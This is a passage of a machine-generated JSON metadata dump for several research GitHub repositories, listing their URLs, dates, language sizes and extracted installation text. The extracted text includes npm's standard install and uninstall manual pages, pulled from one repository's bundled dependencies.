                    "type": "Text_excerpt",
                    "value": "You can start training a new model using the following commands in Terminal (macOS/Linux) or cmd (Windows) as following: \n",
                    "original_header": "Our Tool"
                },
                "confidence": 0.999965916540958,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Wardat-ISU/DeepLocalize/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-02-08T18:16:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-10T20:22:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 518218
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 664
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 640
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "183": {
        "filename": "isabellavieira_incivility_detection_oss_discussions_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ferreira-isa/incivility_detection",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-06-22T01:30:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-12T04:37:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 5408023
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 188642
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 31008
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "184": {
        "filename": "clowee_OpenSZZ_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/clowee/OpenSZZ",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The current version can tag commits in github with the faults reported in Jira. \n \n",
                    "original_header": "OpenSZZ"
                },
                "confidence": 0.991399685156116,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/clowee/OpenSZZ/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-09-04T09:07:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-19T23:13:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 60899
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "185": {
        "filename": "gabrielcsf_malicious-updates-icse2021_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/gabrielcsf/malicious-updates-icse2021",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "npm-uninstall(1) -- Remove a package\n=============================\n\n## SYNOPSIS\n\n    npm uninstall [<@scope>/]<pkg>[@<version>]... [-S|--save|-D|--save-dev|-O|--save-optional]\n\n    aliases: remove, rm, r, un, unlink\n\n## DESCRIPTION\n\nThis uninstalls a package, completely removing everything npm installed\non its behalf.\n\nExample:\n\n    npm uninstall sax\n\nIn global mode (ie, with `-g` or `--global` appended to the command),\nit uninstalls the current package context as a global package.\n\n`npm uninstall` takes 3 exclusive, optional flags which save or update\nthe package version in your main package.json:\n\n* `-S, --save`: Package will be removed from your `dependencies`.\n\n* `-D, --save-dev`: Package will be removed from your `devDependencies`.\n\n* `-O, --save-optional`: Package will be removed from your `optionalDependencies`.\n\nFurther, if you have an `npm-shrinkwrap.json` then it will be updated as\nwell.\n\nScope is optional and follows the usual rules for `npm-scope(7)`.\n\nExamples:\n\n    npm uninstall sax --save\n    npm uninstall @myorg/privatepackage --save\n    npm uninstall node-tap --save-dev\n    npm uninstall dtrace-provider --save-optional\n\n## SEE ALSO\n\n* npm-prune(1)\n* npm-install(1)\n* npm-folders(5)\n* npm-config(1)\n* npm-config(7)\n* npmrc(5)\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/gabrielcsf/malicious-updates-icse2021/main/node-engine-with-permsystem/deps/npm/doc/cli/npm-uninstall.md"
            },
            {
                "result": {
                    "value": "npm-install(1) -- Install a package\n===================================\n\n## SYNOPSIS\n\n    npm install (with no args, in package dir)\n    npm install [<@scope>/]<name>\n    npm install [<@scope>/]<name>@<tag>\n    npm install [<@scope>/]<name>@<version>\n    npm install [<@scope>/]<name>@<version range>\n    npm install <tarball file>\n    npm install <tarball url>\n    npm install <folder>\n\n    alias: npm i\n    common options: [-S|--save|-D|--save-dev|-O|--save-optional] [-E|--save-exact] [-B|--save-bundle] [--dry-run]\n\n## DESCRIPTION\n\nThis command installs a package, and any packages that it depends on. If the\npackage has a shrinkwrap file, the installation of dependencies will be driven\nby that. See npm-shrinkwrap(1).\n\nA `package` is:\n\n* a) a folder containing a program described by a `package.json(5)` file\n* b) a gzipped tarball containing (a)\n* c) a url that resolves to (b)\n* d) a `<name>@<version>` that is published on the registry (see `npm-registry(7)`) with (c)\n* e) a `<name>@<tag>` (see `npm-dist-tag(1)`) that points to (d)\n* f) a `<name>` that has a \"latest\" tag satisfying (e)\n* g) a `<git remote url>` that resolves to (a)\n\nEven if you never publish your package, you can still get a lot of\nbenefits of using npm if you just want to write a node program (a), and\nperhaps if you also want to be able to easily install it elsewhere\nafter packing it up into a tarball (b).\n\n\n* `npm install` (in package directory, no arguments):\n\n    Install the dependencies in the local node_modules folder.\n\n    In global mode (ie, with `-g` or `--global` appended to the command),\n    it installs the current package context (ie, the current working\n    directory) as a global package.\n\n    By default, `npm install` will install all modules listed as dependencies\n    in `package.json(5)`.\n\n    With the `--production` flag (or when the `NODE_ENV` environment variable\n    is set to `production`), npm will not install modules listed in\n    `devDependencies`.\n\n* `npm install <folder>`:\n\n    Install a package that is sitting in a folder on the filesystem.\n\n* `npm install <tarball file>`:\n\n    Install a package that is sitting on the filesystem.  Note: if you just want\n    to link a dev directory into your npm root, you can do this more easily by\n    using `npm link`.\n\n    Example:\n\n          npm install ./package.tgz\n\n* `npm install <tarball url>`:\n\n    Fetch the tarball url, and then install it.  In order to distinguish between\n    this and other options, the argument must start with \"http://\" or \"https://\"\n\n    Example:\n\n          npm install https://github.com/indexzero/forever/tarball/v0.5.6\n\n* `npm install [<@scope>/]<name> [-S|--save|-D|--save-dev|-O|--save-optional]`:\n\n    Do a `<name>@<tag>` install, where `<tag>` is the \"tag\" config. (See\n    `npm-config(7)`. The config's default value is `latest`.)\n\n    In most cases, this will install the latest version\n    of the module published on npm.\n\n    Example:\n\n          npm install sax\n\n    `npm install` takes 3 exclusive, optional flags which save or update\n    the package version in your main package.json:\n\n    * `-S, --save`: Package will appear in your `dependencies`.\n\n    * `-D, --save-dev`: Package will appear in your `devDependencies`.\n\n    * `-O, --save-optional`: Package will appear in your `optionalDependencies`.\n\n    When using any of the above options to save dependencies to your\n    package.json, there are two additional, optional flags:\n\n    * `-E, --save-exact`: Saved dependencies will be configured with an\n      exact version rather than using npm's default semver range\n      operator.\n\n    * `-B, --save-bundle`: Saved dependencies will also be added to your `bundleDependencies` list.\n\n    Further, if you have an `npm-shrinkwrap.json` then it will be updated as\n    well.\n\n    `<scope>` is optional. The package will be downloaded from the registry\n    associated with the specified scope. If no registry is associated with\n    the given scope the default registry is assumed. See `npm-scope(7)`.\n\n    Note: if you do not include the @-symbol on your scope name, npm will\n    interpret this as a GitHub repository instead, see below. Scopes names\n    must also be followed by a slash.\n\n    Examples:\n\n          npm install sax --save\n          npm install githubname/reponame\n          npm install @myorg/privatepackage\n          npm install node-tap --save-dev\n          npm install dtrace-provider --save-optional\n          npm install readable-stream --save --save-exact\n          npm install ansi-regex --save --save-bundle\n\n\n    **Note**: If there is a file or folder named `<name>` in the current\n    working directory, then it will try to install that, and only try to\n    fetch the package by name if it is not valid.\n\n* `npm install [<@scope>/]<name>@<tag>`:\n\n    Install the version of the package that is referenced by the specified tag.\n    If the tag does not exist in the registry data for that package, then this\n    will fail.\n\n    Example:\n\n          npm install sax@latest\n          npm install @myorg/mypackage@latest\n\n* `npm install [<@scope>/]<name>@<version>`:\n\n    Install the specified version of the package.  This will fail if the\n    version has not been published to the registry.\n\n    Example:\n\n          npm install sax@0.1.1\n          npm install @myorg/privatepackage@1.5.0\n\n* `npm install [<@scope>/]<name>@<version range>`:\n\n    Install a version of the package matching the specified version range.  This\n    will follow the same rules for resolving dependencies described in `package.json(5)`.\n\n    Note that most version ranges must be put in quotes so that your shell will\n    treat it as a single argument.\n\n    Example:\n\n          npm install sax@\">=0.1.0 <0.2.0\"\n          npm install @myorg/privatepackage@\">=0.1.0 <0.2.0\"\n\n* `npm install <git remote url>`:\n\n    Installs the package from the hosted git provider, cloning it with\n    `git`. First it tries via the https (git with github) and if that fails, via ssh.\n\n          <protocol>://[<user>[:<password>]@]<hostname>[:<port>][:][/]<path>[#<commit-ish>]\n\n    `<protocol>` is one of `git`, `git+ssh`, `git+http`, `git+https`,\n    or `git+file`.\n    If no `<commit-ish>` is specified, then `master` is used.\n\n    If the repository makes use of submodules, those submodules will\n    be cloned as well.\n\n    The following git environment variables are recognized by npm and will be added\n    to the environment when running git:\n\n    * `GIT_ASKPASS`\n    * `GIT_EXEC_PATH`\n    * `GIT_PROXY_COMMAND`\n    * `GIT_SSH`\n    * `GIT_SSH_COMMAND`\n    * `GIT_SSL_CAINFO`\n    * `GIT_SSL_NO_VERIFY`\n\n    See the git man page for details.\n\n    Examples:\n\n          npm install git+ssh://git@github.com:npm/npm.git#v1.0.27\n          npm install git+https://isaacs@github.com/npm/npm.git\n          npm install git://github.com/npm/npm.git#v1.0.27\n          GIT_SSH_COMMAND='ssh -i ~/.ssh/custom_ident' npm install git+ssh://git@github.com:npm/npm.git\n\n* `npm install <githubname>/<githubrepo>[#<commit-ish>]`:\n* `npm install github:<githubname>/<githubrepo>[#<commit-ish>]`:\n\n    Install the package at `https://github.com/githubname/githubrepo` by\n    attempting to clone it using `git`.\n\n    If you don't specify a *commit-ish* then `master` will be used.\n\n    Examples:\n\n          npm install mygithubuser/myproject\n          npm install github:mygithubuser/myproject\n\n* `npm install gist:[<githubname>/]<gistID>[#<commit-ish>]`:\n\n    Install the package at `https://gist.github.com/gistID` by attempting to\n    clone it using `git`. The GitHub username associated with the gist is\n    optional and will not be saved in `package.json` if `-S` or `--save` is used.\n\n    If you don't specify a *commit-ish* then `master` will be used.\n\n    Example:\n\n          npm install gist:101a11beef\n\n* `npm install bitbucket:<bitbucketname>/<bitbucketrepo>[#<commit-ish>]`:\n\n    Install the package at `https://bitbucket.org/bitbucketname/bitbucketrepo`\n    by attempting to clone it using `git`.\n\n    If you don't specify a *commit-ish* then `master` will be used.\n\n    Example:\n\n          npm install bitbucket:mybitbucketuser/myproject\n\n* `npm install gitlab:<gitlabname>/<gitlabrepo>[#<commit-ish>]`:\n\n    Install the package at `https://gitlab.com/gitlabname/gitlabrepo`\n    by attempting to clone it using `git`.\n\n    If you don't specify a *commit-ish* then `master` will be used.\n\n    Example:\n\n          npm install gitlab:mygitlabuser/myproject\n\nYou may combine multiple arguments, and even multiple types of arguments.\nFor example:\n\n    npm install sax@\">=0.1.0 <0.2.0\" bench supervisor\n\nThe `--tag` argument will apply to all of the specified install targets. If a\ntag with the given name exists, the tagged version is preferred over newer\nversions.\n\nThe `--dry-run` argument will report in the usual way what the install would\nhave done without actually installing anything.\n\nThe `-f` or `--force` argument will force npm to fetch remote resources even if a\nlocal copy exists on disk.\n\n    npm install sax --force\n\nThe `-g` or `--global` argument will cause npm to install the package globally\nrather than locally.  See `npm-folders(5)`.\n\nThe `--global-style` argument will cause npm to install the package into\nyour local `node_modules` folder with the same layout it uses with the\nglobal `node_modules` folder. Only your direct dependencies will show in\n`node_modules` and everything they depend on will be flattened in their\n`node_modules` folders. This obviously will eliminate some deduping.\n\nThe `--ignore-scripts` argument will cause npm to not execute any \nscripts defined in the package.json. See `npm-scripts(7)`.\n\nThe `--legacy-bundling` argument will cause npm to install the package such\nthat versions of npm prior to 1.4, such as the one included with node 0.8,\ncan install the package. This eliminates all automatic deduping.\n\nThe `--link` argument will cause npm to link global installs into the\nlocal space in some cases.\n\nThe `--no-bin-links` argument will prevent npm from creating symlinks for\nany binaries the package might contain.\n\nThe `--no-optional` argument will prevent optional dependencies from\nbeing installed.\n\nThe `--no-shrinkwrap` argument, which will ignore an available\nshrinkwrap file and use the package.json instead.\n\nThe `--nodedir=/path/to/node/source` argument will allow npm to find the\nnode source code so that npm can compile native modules.\n\nThe `--only={prod[uction]|dev[elopment]}` argument will cause either only\n`devDependencies` or only non-`devDependencies` to be installed regardless of the `NODE_ENV`.\n\nSee `npm-config(7)`.  Many of the configuration params have some\neffect on installation, since that's most of what npm does.\n\n## ALGORITHM\n\nTo install a package, npm uses the following algorithm:\n\n    load the existing node_modules tree from disk\n    clone the tree\n    fetch the package.json and assorted metadata and add it to the clone\n    walk the clone and add any missing dependencies\n      dependencies will be added as close to the top as is possible\n      without breaking any other modules\n    compare the original tree with the cloned tree and make a list of\n    actions to take to convert one to the other\n    execute all of the actions, deepest first\n      kinds of actions are install, update, remove and move\n\nFor this `package{dep}` structure: `A{B,C}, B{C}, C{D}`,\nthis algorithm produces:\n\n    A\n    +-- B\n    +-- C\n    +-- D\n\nThat is, the dependency from B to C is satisfied by the fact that A\nalready caused C to be installed at a higher level. D is still installed\nat the top level because nothing conflicts with it.\n\nFor `A{B,C}, B{C,D@1}, C{D@2}`, this algorithm produces:\n\n    A\n    +-- B\n    +-- C\n       `-- D@2\n    +-- D@1\n\nBecause B's D@1 will be installed in the top level, C now has to install D@2\nprivately for itself.\n\nSee npm-folders(5) for a more detailed description of the specific\nfolder structures that npm creates.\n\n### Limitations of npm's Install Algorithm\n\nThere are some very rare and pathological edge-cases where a cycle can\ncause npm to try to install a never-ending tree of packages.  Here is\nthe simplest case:\n\n    A -> B -> A' -> B' -> A -> B -> A' -> B' -> A -> ...\n\nwhere `A` is some version of a package, and `A'` is a different version\nof the same package.  Because `B` depends on a different version of `A`\nthan the one that is already in the tree, it must install a separate\ncopy.  The same is true of `A'`, which must install `B'`.  Because `B'`\ndepends on the original version of `A`, which has been overridden, the\ncycle falls into infinite regress.\n\nTo avoid this situation, npm flat-out refuses to install any\n`name@version` that is already present anywhere in the tree of package\nfolder ancestors.  A more correct, but more complex, solution would be\nto symlink the existing version into the new location.  If this ever\naffects a real use-case, it will be investigated.\n\n## SEE ALSO\n\n* npm-folders(5)\n* npm-update(1)\n* npm-link(1)\n* npm-rebuild(1)\n* npm-scripts(7)\n* npm-build(1)\n* npm-config(1)\n* npm-config(7)\n* npmrc(5)\n* npm-registry(7)\n* npm-tag(1)\n* npm-uninstall(1)\n* npm-shrinkwrap(1)\n* package.json(5)\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/gabrielcsf/malicious-updates-icse2021/main/node-engine-with-permsystem/deps/npm/doc/cli/npm-install.md"
            },
            {
                "result": {
                    "value": "# npm install-test(1) -- Install package(s) and run tests\n\n## SYNOPSIS\n\n    npm install-test (with no args, in package dir)\n    npm install-test [<@scope>/]<name>\n    npm install-test [<@scope>/]<name>@<tag>\n    npm install-test [<@scope>/]<name>@<version>\n    npm install-test [<@scope>/]<name>@<version range>\n    npm install-test <tarball file>\n    npm install-test <tarball url>\n    npm install-test <folder>\n\n    alias: npm it\n    common options: [--save|--save-dev|--save-optional] [--save-exact] [--dry-run]\n\n## DESCRIPTION\n\nThis command runs an `npm install` followed immediately by an `npm test`. It\ntakes exactly the same arguments as `npm install`.\n\n## SEE ALSO\n\n- npm-install(1)\n- npm-test(1)\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/gabrielcsf/malicious-updates-icse2021/main/node-engine-with-permsystem/deps/npm/doc/cli/npm-install-test.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-02-12T00:01:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-18T03:14:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 76736563
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 31350930
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 27417340
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Assembly",
                    "name": "Assembly",
                    "type": "Programming_language",
                    "size": 11425394
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 3362036
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2655647
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1049089
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 915663
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "DIGITAL Command Language",
                    "name": "DIGITAL Command Language",
                    "type": "Programming_language",
                    "size": 349320
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "POV-Ray SDL",
                    "name": "POV-Ray SDL",
                    "type": "Programming_language",
                    "size": 307541
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 286352
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 260964
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ada",
                    "name": "Ada",
                    "type": "Programming_language",
                    "size": 89080
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 86110
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 80277
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Pascal",
                    "name": "Pascal",
                    "type": "Programming_language",
                    "size": 70297
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "M4",
                    "name": "M4",
                    "type": "Programming_language",
                    "size": 64355
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 54012
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "DTrace",
                    "name": "DTrace",
                    "type": "Programming_language",
                    "size": 37428
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Raku",
                    "name": "Raku",
                    "type": "Programming_language",
                    "size": 34072
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Prolog",
                    "name": "Prolog",
                    "type": "Programming_language",
                    "size": 29177
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Emacs Lisp",
                    "name": "Emacs Lisp",
                    "type": "Programming_language",
                    "size": 19654
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 16431
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Lua",
                    "name": "Lua",
                    "type": "Programming_language",
                    "size": 16269
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Scheme",
                    "name": "Scheme",
                    "type": "Programming_language",
                    "size": 14853
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 10488
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 8098
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CLIPS",
                    "name": "CLIPS",
                    "type": "Programming_language",
                    "size": 5291
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "eC",
                    "name": "eC",
                    "type": "Programming_language",
                    "size": 5158
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "XS",
                    "name": "XS",
                    "type": "Programming_language",
                    "size": 4319
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vim Script",
                    "name": "Vim Script",
                    "type": "Programming_language",
                    "size": 4075
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "GDB",
                    "name": "GDB",
                    "type": "Programming_language",
                    "size": 4016
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "NSIS",
                    "name": "NSIS",
                    "type": "Programming_language",
                    "size": 2860
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SAS",
                    "name": "SAS",
                    "type": "Programming_language",
                    "size": 1847
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Module Management System",
                    "name": "Module Management System",
                    "type": "Programming_language",
                    "size": 1545
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 500
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "186": {
        "filename": "av9ash_DuplicateBugDetection_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/av9ash/DuplicateBugDetection",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-04-08T06:04:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-02T22:46:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 57655
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "187": {
        "filename": "gbrltv_process_meta_learning_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/gbrltv/process_meta_learning",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Clone this repo to your local machine using\n\n```shell\ngit clone https://github.com/gbrltv/process_meta_learning.git\n```\n\nTo directly use meta feature extraction methods via `import`\n```shell\ncd process_meta_learning\npip install -e .\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Clone",
                    "parent_header": [
                        "Meta-Learning applied to Process Mining",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/gbrltv/process_meta_learning/main/README.md"
            },
            {
                "result": {
                    "value": "\nBefore running the experiments, it is necessary to convert the original logs (`xes.gz`) to the `xes` format (entropy extraction does not accept `xes.gz` files). For that, run:\n\n```shell\npython3 convert_log_files.py\n```\n\nThis code converts files under the `event_logs` folder and removes the original files.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Data preparation",
                    "parent_header": [
                        "Meta-Learning applied to Process Mining",
                        "Experimental Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/gbrltv/process_meta_learning/main/README.md"
            },
            {
                "result": {
                    "value": "To extract the meta-features from event logs, simply run the following line of code:\n\n```shell\npython3 extract_features.py\n```\n\nThe meta-features are saved under the `results` folder with the name `log_features.csv`.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Extracting Meta-features",
                    "parent_header": [
                        "Meta-Learning applied to Process Mining",
                        "Experimental Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/gbrltv/process_meta_learning/main/README.md"
            },
            {
                "result": {
                    "value": "To compute model quality metrics (fitness, precision, generalization, simplicity), run the following code:\n\n\n```shell\npython3 model_metrics.py\n```\n\nThe quality metrics (along with their computation time) are saved under the `results` folder with the name `model_metrics.csv`.\n",
                    "type": "Text_excerpt",
                    "original_header": "Model Quality Metrics",
                    "parent_header": [
                        "Meta-Learning applied to Process Mining",
                        "Experimental Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/gbrltv/process_meta_learning/main/README.md"
            },
            {
                "result": {
                    "value": "For an in-depth analysis of results, classification performance, model relevance, and quality metrics, please take a look [here](https://github.com/gbrltv/process_meta_learning/blob/main/evaluation.ipynb).\n",
                    "type": "Text_excerpt",
                    "original_header": "Evaluating Results",
                    "parent_header": [
                        "Meta-Learning applied to Process Mining",
                        "Experimental Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/gbrltv/process_meta_learning/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-03-10T19:30:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-29T16:32:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 320779
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 15123
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "188": {
        "filename": "chenjshnn_LabelDroid_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/chenjshnn/LabelDroid",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-08-24T11:18:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-09T06:17:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 95944
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 936
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "189": {
        "filename": "KTH_royal-chaos_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/royal-chaos",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-02-06T10:29:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T19:35:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 49240942
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 25976900
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
